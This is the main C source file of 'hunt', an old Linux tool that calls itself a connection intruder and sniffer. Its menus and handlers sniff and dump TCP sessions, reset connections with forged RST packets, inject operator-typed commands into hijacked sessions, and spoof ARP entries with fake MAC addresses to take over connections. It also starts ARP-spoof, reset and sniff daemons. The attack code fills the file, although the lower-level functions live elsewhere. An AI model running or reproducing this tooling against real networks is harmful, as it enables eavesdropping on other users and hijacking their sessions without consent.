/*
 *
 *	This is free software. You can redistribute it and/or modify under
 *	the terms of the GNU General Public License version 2.
 *
 * 	Copyright (C) 1998 by kra
 *
 */
#include "hunt.h"
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <pthread.h>


void logo(void)
{
	printf("/*\n"
	       " *\thunt " VERSION "\n"
	       " *\tmultipurpose connection intruder / sniffer for Linux\n"
	       " *\t(c) 1998-2000 by kra\n"
	       " */\n");
}

void list_connections(void)
{
	char *buf;
	char *__buf, *b;
	int i = 0;

	clear_new_conn_ind();
	
	conn_list(NULL, &buf, conn_list_mac, conn_list_seq);
	if (buf) {
		__buf = buf;
		while ((b = strtok(__buf, "\n"))) {
			__buf = NULL;
			printf("%s\n", b);
			if (++i % lines_o == 0)
				lines_o_press_key();
		}
		free(buf);
	} else
		printf("no connections are available\n");
}

int choose_connection(struct user_conn_info *uci)
{
	struct user_conn_info *arr_uci;
	char *str;
	int count, i;
	int retval = -1;
	
	count = conn_list(&arr_uci, &str, 0, 0);
	if (arr_uci) {
		printf("%s\n", str);
		free(str);
		if ((i = menu_choose_unr("choose conn", 0, count - 1, -1)) >= 0) {
			memcpy(uci, &arr_uci[i], sizeof(struct user_conn_info));
			retval = 0;
		}
		free(arr_uci);
	} else
		printf("no connections are available\n");
	return retval;
}


struct list l_dump_connection = LIST_INIT(struct packet, p_next[MODULE_DUMP_CONN]);

void func_dump_connection_dst(struct packet *p, struct user_conn_info *arg)
{
	if (p->p_iph->saddr == arg->dst_addr &&
	    p->p_iph->daddr == arg->src_addr &&
	    p->p_hdr.p_tcph->source == arg->dst_port &&
	    p->p_hdr.p_tcph->dest == arg->src_port) {
		packet_want(p);
		list_produce(&l_dump_connection, p);
	}
}

void func_dump_connection_src(struct packet *p, struct user_conn_info *arg)
{
	if (p->p_iph->saddr == arg->src_addr &&
	    p->p_iph->daddr == arg->dst_addr &&
	    p->p_hdr.p_tcph->source == arg->src_port &&
	    p->p_hdr.p_tcph->dest == arg->dst_port) {
		packet_want(p);
		list_produce(&l_dump_connection, p);
	}
}

volatile int loop_running;
static void ctrl_c_handler(int i)
{
	loop_running = 0;
};

/*
 * mode == 0 - dst
 * 	   1 - src
 *         2 - both
 */
void dump_connection_uci(struct user_conn_info *uci, int mode, int same_chars)
{
	struct packet *p;
	struct ifunc_item ifunc_src, ifunc_dst;
	struct sigaction sac, old_sac;
	int dst_packet;
	char pbuf[256];
	int pbuf_len;

	clear_scr();
	ctrl_c_prompt();
	list_produce_start(&l_dump_connection);
	if (mode == 0 || mode == 2) {
		ifunc_dst.func = (void(*)(struct packet *, void *))
					func_dump_connection_dst;
		ifunc_dst.arg = uci;
		list_enqueue(&l_ifunc_tcp, &ifunc_dst);
	}
	if (mode == 1 || mode == 2) {
		ifunc_src.func = (void(*)(struct packet *, void *))
		    			func_dump_connection_src;
		ifunc_src.arg = uci;
		list_enqueue(&l_ifunc_tcp, &ifunc_src);
	}
	sac.sa_handler = ctrl_c_handler;
	sigemptyset(&sac.sa_mask);
	sigaddset(&sac.sa_mask, SIGINT);
	sac.sa_flags = SA_RESTART;
	sigaction(SIGINT, &sac, &old_sac);
	loop_running = 1;
	while (loop_running && (p = list_consume(&l_dump_connection, NULL))) {
		if (p->p_iph->saddr == uci->src_addr &&
		    p->p_iph->daddr == uci->dst_addr &&
		    p->p_hdr.p_tcph->source == uci->src_port &&
		    p->p_hdr.p_tcph->dest == uci->dst_port)
			dst_packet = 0;
		else
			dst_packet = 1;
		/*
		 * packet from source
		 */
		if (!dst_packet && p->p_data_len && !same_chars) {
			pbuf_len = p->p_data_len < sizeof(pbuf) ? p->p_data_len : sizeof(pbuf);
			memcpy(pbuf, p->p_data, pbuf_len);
		} else
			pbuf_len = 0;
		/*
		 * packet from destination
		 */
		if (dst_packet && p->p_data_len && !same_chars) {
			if (p->p_data_len == pbuf_len &&
			    memcmp(p->p_data, pbuf, pbuf_len) == 0) {
				pbuf_len = 0;
			} else
			    print_data_packet(p, p->p_data_len, 0, dst_packet);
		} else
			print_data_packet(p, p->p_data_len, 0, dst_packet);
		
		packet_free(p);
	}
	if (mode == 0 || mode == 2)
		list_remove(&l_ifunc_tcp, &ifunc_dst);
	if (mode == 1 || mode == 2)
		list_remove(&l_ifunc_tcp, &ifunc_src);
	packet_flush(&l_dump_connection);
	tty_tput_reset();
	press_key("\n\n-- press any key> ");
	sigaction(SIGINT, &old_sac, NULL);
}

void dump_connection(struct user_conn_info *uci)
{
	int c;
	
	c = menu_choose_sdb("dump", 'b');
	switch (c) {
	    case 'd':
		dump_connection_uci(uci, MODE_SRC, 0);
		break;
	    case 's':
		dump_connection_uci(uci, MODE_DST, 0);
		break;
	    case 'b':
		c = menu_choose_char("print src/dst same characters y/n", "ny", 'n');
		switch (c) {
		    case 'n':
			dump_connection_uci(uci, MODE_BOTH, 0);
			break;
		    case 'y':
			dump_connection_uci(uci, MODE_BOTH, 1);
			break;
		}
		break;
	}
}

void reset_connection(void)
{
	struct user_conn_info uci;
	int c;
	
	if (!choose_connection(&uci)) {
		c = menu_choose_sdb("reset", 'b');
		switch (c) {
		    case 'd':
			user_rst(&uci, 1, MODE_DST);
			printf("done\n");
			break;
		    case 's':
			user_rst(&uci, 1, MODE_SRC);
			printf("done\n");
			break;
		    case 'b':
			user_rst(&uci, 1, MODE_BOTH);
			printf("done\n");
			break;
		}
	}
}

void simple_hijack(void)
{
	char cmdbuf[256];
	struct user_conn_info uci;
	int retval = 0;
	int c;
	
	if (!choose_connection(&uci)) {
		c = menu_choose_char("dump connection y/n", "yn", 'n');
		switch (c) {
		    case 'y':
			dump_connection(&uci);
			break;
		}
		do {
			set_tty_color(COLOR_WHITE);
			fprintf(stdout,"Enter the command string you wish executed or [cr]> ");
			set_tty_color(COLOR_LIGHTGRAY);
			fflush(stdout);
			fgets(cmdbuf, sizeof(cmdbuf), stdin);
			if(cmdbuf[0] == 0x0a)
				break;
		} while ((retval = user_stormack_hijack(&uci, cmdbuf)) == 0);
		if (retval <= 0) {
			c = menu_choose_char("[r]eset connection/[s]ynchronize/[n]one", "rsn", 'r');
			switch (c) {
			    case 'r':
				user_rst(&uci, 1, MODE_BOTH);
				break;
			    case 's':
				if (user_hijack_sync(&uci)) {
					printf("\n");
					c = menu_choose_char("[r]eset connection/[n]one", "rn", 'r');
					switch (c) {
					    case 'r':
						user_rst(&uci, 1, MODE_BOTH);
						break;
					}
				} else
					printf("\n");
				break;
			}
		}
		printf("done\n");
	}
}

void a_hijack(void)
{
	unsigned char __src_fake_mac[ETH_ALEN] = {0xEA, 0x1A, 0xDE, 0xAD, 0xBE, 0xEF};
	unsigned char __dst_fake_mac[ETH_ALEN] = {0xEA, 0x1A, 0xDE, 0xAD, 0xBE, 0xEE};
	unsigned char *src_fake_mac = NULL;
	unsigned char *dst_fake_mac = NULL;
	char buf[BUFSIZE];
	struct user_conn_info uci;
	int retval, retval2;
	int c, input_mode;
	
	if (!choose_connection(&uci)) {
		if (!get_arp_spoof(uci.src_addr, uci.dst_addr) &&
		    !get_arp_spoof(uci.dst_addr, uci.src_addr)) {
			c = menu_choose_char("arp spoof src in dst y/n", "yn", 'y');
			switch (c) {
			    case 'y':
				sprintf_eth_mac(buf, suggest_mac());
				if (menu_choose_mac("src MAC", __src_fake_mac, buf) < 0)
					return;
				src_fake_mac = __src_fake_mac;
				break;
			    case 'n':
				src_fake_mac = NULL;
				break;
			    default:
				return;
			}
			c = menu_choose_char("arp spoof dst in src y/n", "yn", 'y');
			switch (c) {
			    case 'y':
				sprintf_eth_mac(buf, suggest_mac());
				if (menu_choose_mac("dst MAC", __dst_fake_mac, buf) < 0)
					return;
				dst_fake_mac = __dst_fake_mac;
				break;
			    case 'n':
				dst_fake_mac = NULL;
				break;
			    default:
				return;
			}
			if (!src_fake_mac && !dst_fake_mac) {
				printf("Possible ACK storm can ocure because you don't do ARP spoof at all, OK\n");
			}
		} else {
			printf("hosts already ARP spoofed\n");
		}
		switch (menu_choose_char("input mode [r]aw, [l]ine+echo+\\r, line+[e]cho", "rle", 'r')) {
		    case 'r':
			input_mode = INPUT_MODE_RAW;
			break;
		    case 'l':
			input_mode = INPUT_MODE_LINEECHOR;
			break;
		    case 'e':
			input_mode = INPUT_MODE_LINEECHO;
			break;
		    default:
			return;
		}
		c = menu_choose_char("dump connectin y/n", "yn", 'y');
		switch (c) {
		    case 'y':
			dump_connection(&uci);
			break;
		    case 'n':
			press_key("press key to take over of connection");
			break;
		    default:
			return;
		}
		retval = user_arp_hijack(&uci, src_fake_mac, dst_fake_mac, input_mode);
/*		user_arp_hijack_done();*/
		if (retval <= 0) {
			c = menu_choose_char("\n[r]eset connection/[s]ynchronize/[n]one", "rsn", 'r');
			switch (c) {
			    case 'r':
				user_rst(&uci, 1, MODE_BOTH);
				break;
			    case 's':
				retval2 = user_hijack_sync(&uci);
				if (retval2) {
					printf("\n");
					c = menu_choose_char("[r]eset connection/[n]one", "rn", 'r');
					switch (c) {
					    case 'r':
						user_rst(&uci, 1, MODE_BOTH);
						break;
					}
				} else
					printf("\n");
				break;
			}
		}
		user_arp_hijack_done(src_fake_mac, dst_fake_mac);
		printf("done\n");
	}
}

static void choose_daemon(void)
{
	char *daemon_menu = "r) reset daemon\n"
			    "a) arp spoof + arp relayer daemon\n"
			    "s) sniff daemon\n"
			    "m) mac discovery daemon\n"
			    "x) return\n";
	char *daemon_chars = "rasmx";
	int run_it = 1;
	
	while (run_it) {
		switch (menu("daemons", daemon_menu, "dm", daemon_chars, 0)) {
		    case 'r':
			rstd_menu();
			break;
		    case 'a':
			arpspoof_menu();
			break;
		    case 's':
			sniff_menu();
			break;
		    case 'm':
			mac_disc_menu();
			break;
		    case 'x':
			run_it = 0;
			break;
		}
	}
}

static void init_modules(void)
{
}

static void usage(char *argv0)
{
	char *prog_name;

	if ((prog_name = strrchr(argv0, '/')))
		prog_name++;
	else
		prog_name = argv0;
	fprintf(stderr, "usage: %s -vV [-i eth_interface]\n", prog_name);
}

char *main_menu = "l/w/r) list/watch/reset connections\n"
		  "u)     host up tests\n"
		  "a)     arp/simple hijack (avoids ack storm if arp used)\n"
		  "s)     simple hijack\n" /*     (ack stormed - src Linux avoids ack storm)\n */
		  "d)     daemons rst/arp/sniff/mac\n"
		  "o)     options\n"
		  "x)     exit\n";
char *main_menu_opt = "lwrusadox";

char *eth_device = "eth0";


void finish_c_handler(int sig)
{
	exit(1);	/* ok, try to run atexit handlers */
}

void main_reset(void)
{
	tap(eth_device, 0);
	set_tty_color(COLOR_LIGHTGRAY);
	printf("\ndone\n");
}


pthread_t th_hunt = (pthread_t) 0;
pthread_t main_thread_id = (pthread_t) 0;
int verbose = 0;
sigset_t intr_mask;

int tj_func(void *arg, int sec)
{
	printf("tj func %s return %d\n", (char *) arg, sec);
	return sec;
}

int main(int argc, char *argv[])
{
	struct user_conn_info uci;
	struct sigaction sac;
	int run_it;
	int c;
	
	if (geteuid() || getuid()) {
		fprintf(stderr, "UID or EUID of 0 needed\n");
		exit(1);
	}
	main_thread_id = pthread_self();
	while ((c = getopt(argc, argv, "vVi:")) != EOF) {
		switch (c) {
		    case 'i':
			eth_device = optarg;
			break;
		    case 'v':
			verbose++;
			break;
		    case 'V':
			printf("hunt: version " VERSION "\n");
			exit(0);
		    default:
			usage(argv[0]);
			exit(1);
		}
	}
	sigemptyset(&intr_mask);
	sigaddset(&intr_mask, SIGINT);

	setpriority(PRIO_PROCESS, getpid(), 0);
	sac.sa_handler = finish_c_handler;
	sigemptyset(&sac.sa_mask);
	sigaddset(&sac.sa_mask, SIGINT);
	sac.sa_flags = SA_RESTART;
	sigaction(SIGINT, &sac, NULL);
	
	logo();

	resolv_init();
	timer_init();
	init_modules();
	
	if (pthread_create(&th_hunt, NULL, hunt, NULL))
		exit(1);
	pthread_mutex_lock(&mutex_hunt_ready);
	while (!hunt_ready)
		pthread_cond_wait(&cond_hunt_ready, &mutex_hunt_ready);
	pthread_mutex_unlock(&mutex_hunt_ready);
	atexit(main_reset);
	atexit(tty_atexit);
	atexit(timer_done);
	atexit(resolv_done);
	
	run_it = 1;
	while (run_it) {
		switch (menu("Main Menu", main_menu, NULL, main_menu_opt, 0)) {
		    case 'l':
			list_connections();
			break;
		    case 'r':
			reset_connection();
			break;
		    case 's':
			simple_hijack();
			break;
		    case 'a':
			a_hijack();
			break;
		    case 'w':
			if (!choose_connection(&uci))
				dump_connection(&uci);
			break;
		    case 'u':
			host_up();
			break;
		    case 'd':
			choose_daemon();
			break;
		    case 'o':
			options_menu();
			break;
		    case 'x':
			if (arpspoof_exit_check() != 0)
				break;
			switch (menu_choose_char("exit? y/n", "yn", 'y')) {
			    case 'y':
				run_it = 0;
				break;
			}
			break;
		}
	}
	return 0;
}
